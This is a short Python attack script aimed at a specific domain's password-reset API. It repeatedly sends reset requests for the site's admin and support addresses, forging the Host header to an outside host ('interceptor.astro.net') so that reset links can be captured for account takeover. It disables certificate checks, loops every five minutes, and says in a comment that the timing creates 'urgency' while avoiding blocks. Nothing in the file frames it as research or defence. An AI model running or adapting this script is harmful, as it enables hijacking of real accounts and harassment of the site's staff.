import requests
import time

EMAILS = ["admin@seodomains.com.hr", "support@seodomains.com.hr"]
API_URL = "https://seodomains.com.hr/api/guest/client/reset_password"
SINKHOLE = "interceptor.astro.net"

def trigger():
    print("[!] Launching SOCIAL TRIGGER ASSAULT...")
    while True:
        for email in EMAILS:
            headers = {"Host": SINKHOLE, "Content-Type": "application/json"}
            try:
                requests.post(API_URL, json={"email": email}, headers=headers, verify=False, timeout=5)
                print(f"[+] Trigger sent to {email} at {time.ctime()}")
            except:
                pass
        time.sleep(300) # Every 5 minutes to create 'urgency' without triggering hard blocks

if __name__ == "__main__":
    trigger()
